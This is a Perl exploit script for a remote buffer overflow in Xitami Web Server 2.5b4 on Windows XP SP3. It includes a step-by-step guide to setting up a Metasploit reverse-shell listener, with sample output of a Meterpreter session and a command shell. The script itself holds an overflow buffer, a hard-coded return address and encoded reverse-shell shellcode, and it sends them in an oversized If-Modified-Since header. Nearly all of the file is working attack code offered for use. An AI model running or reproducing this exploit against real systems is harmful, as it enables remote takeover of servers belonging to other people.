#!/usr/bin/perl
# -------------------------------------------------------------
# Xitami Web Server 2.5b4 - Remote Buffer Overflow Exploit.
# Exploit coded by mr.pr0n [http://s3cure.gr] .
# Many greetz to krumel for his help :-).
# -------------------------------------------------------------
# -------------------------------------------------------------
# Tested on: Xitami 2.5b4 / English Windows XP - SP3
# -------------------------------------------------------------
# ------------------------------------------------------------------------
# Bug for 2.5c2 discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# -------------------------------------------------------------------------
#
# ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ *
#
# --------------------------------
# Quick user guide!
# --------------------------------
# 1st Step: Set up the listener.
# --------------------------------
#	msf > use multi/handler
#	msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_ord_tcp 
#	PAYLOAD => windows/meterpreter/reverse_ord_tcp
#	msf exploit(handler) > set LHOST 192.168.178.25
#	LHOST => 192.168.178.25
#	msf exploit(handler) > exploit
#
#	[*] Started reverse handler on 192.168.178.25:4444 
#	[*] Starting the payload handler...
# 
# --------------------------------
# 2nd Step: Execute the exploit.
# --------------------------------
#	root@bt:~# cd Desktop/ 
#	root@bt:~# ./Xitami2_5b4.pl 
#
#	#----[ mr.pr0n ]---------------------------------------------------------#
#	#    Target App: Xitami Web Server 2.5b4                                 #
#	#    Attack    : Remote Buffer Overflow Exploit.                         #
#	#    Target OS : Windows XP Pro English [Service Pack 3].                #
#	#---------------------------------------------[ http://s3cure.gr ]-------#
#
#	Enter your target's IP (e.g.: 192.168.0.123)
#	> 192.168.178.37
#
#	[*] Sending the evil header at: 192.168.178.37 ...
#	[*] OK, exploitation Done!
#	[*] Check please for the shell...
# 
# --------------------------------
# 3nd Step: N'joy your shell :-)
# --------------------------------
#	[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
#	[*] Sending stage (749056 bytes) to 192.168.178.37
#	[*] Meterpreter session 1 opened (192.168.178.25:4444 -> 192.168.178.37:1031) at 2011-05-31 02:13:33 +0300
#
#	meterpreter > sysinfo
#	Computer        : xxxxxx-xxxxxx
#	OS              : Windows XP (Build 2600, Service Pack 3).
#	Architecture    : x86
#	System Language : en_US
#	Meterpreter     : x86/win32
#	meterpreter > shell
#	Process 320 created.
#	Channel 1 created.
#	Microsoft Windows XP [Version 5.1.2600]
#	(C) Copyright 1985-2001 Microsoft Corp.
#
#	C:\Xitami>
#
# ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ * ~ *
#

use IO::Socket;
print "\n#----[ mr.pr0n ]---------------------------------------------------------#\n";
print "#    Target App: Xitami Web Server 2.5b4                                 #\n";
print "#    Attack    : Remote Buffer Overflow Exploit.                         #\n";
print "#    Target OS : Windows XP Pro English [Service Pack 3].                #\n";
print "#---------------------------------------------[ http://s3cure.gr ]-------#\n";

print "\nEnter your target's IP (e.g.: 192.168.0.123)";
print "\n> ";
$target=<STDIN>;
chomp($target);

#---------------------------#
$junk 		= "\x41" x 72; 			# 72 x "A".
$RET		= "\x53\x2b\xab\x71"; 		# ws2_32.dll push ESP - ret - (Windows XP SP3 - [En]).
$jmp 		= "\xeb\x22";	 		# JMP +0x22.
$nops 		= "\x90" x 100;   		# 100 Nops.
#---------------------------#

# ./msfpayload win32_reverse_ord EXITFUNC=thread LHOST=192.168.178.25 LPORT=4444 R | ./msfencode -e PexAlphaNum
# [*] Using Msf::Encoder::PexAlphaNum with final size of 261 bytes

$shellcode =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x41\x33\x4b\x4d".
"\x46\x56\x4b\x48\x43\x34\x42\x43\x4b\x48\x42\x44\x4e\x30\x4b\x48".
"\x42\x55\x4e\x31\x4b\x38\x44\x31\x4b\x48\x44\x37\x42\x42\x4d\x4a".
"\x4d\x4a\x50\x54\x43\x50\x48\x30\x4d\x53\x44\x43\x43\x53\x4f\x45".
"\x44\x33\x45\x37\x4f\x4e\x4b\x58\x4c\x36\x4a\x50\x4b\x58\x45\x54".
"\x4e\x33\x4b\x38\x4e\x54\x45\x50\x4a\x47\x4b\x58\x4e\x44\x4d\x50".
"\x4e\x41\x41\x30\x49\x4e\x4b\x58\x41\x34\x4a\x55\x41\x50\x4a\x4e".
"\x4b\x48\x41\x57\x4e\x53\x41\x50\x50\x4e\x43\x50\x49\x36\x4e\x50".
"\x43\x55\x4c\x46\x41\x30\x4c\x36\x44\x30\x4f\x4f\x42\x4d\x47\x39".
"\x4a\x36\x42\x4c\x4a\x4a\x44\x4b\x49\x51\x4a\x36\x44\x50\x42\x50".
"\x41\x31\x4e\x35\x49\x58\x41\x4e\x43\x35\x47\x4b\x4e\x50\x43\x35".
"\x41\x45\x47\x55\x41\x45\x4c\x56\x42\x41\x41\x55\x47\x35\x48\x55".
"\x4f\x4f\x45\x4e\x5a";

if ($socket = IO::Socket::INET->new
	 (PeerAddr => $target,
	 PeerPort => "80", 
	 Proto => "TCP"))
	 
		{ 
		$exploit  = $junk.$RET.$jmp.$nops.$shellcode;
		#
		#---------------------------------#
		# If we send an If-Modified-Since header,
		# containing an overly long string (for example our exploit)
		# it may be possible to execute (remotely) a payload!!
		#---------------------------------#
		#
		# This is the evil header! }:-)
		$header =
		"GET / HTTP/1.1\r\n".
		"Host: ".$target." \r\n".
		"If-Modified-Since: p0wnp0wnb00m! "." $exploit\r\n";
		print "\n[*] Sending the evil header at: $target ...\n";
		print $socket $header."\r\n";
		sleep(1);
		close($socket);
		print "[*] OK, exploitation Done!\n";
		print "[*] Check please the shell..\n\n";
		}

else
	{
	print "[-] Connection to $target failed!\n";
	} 
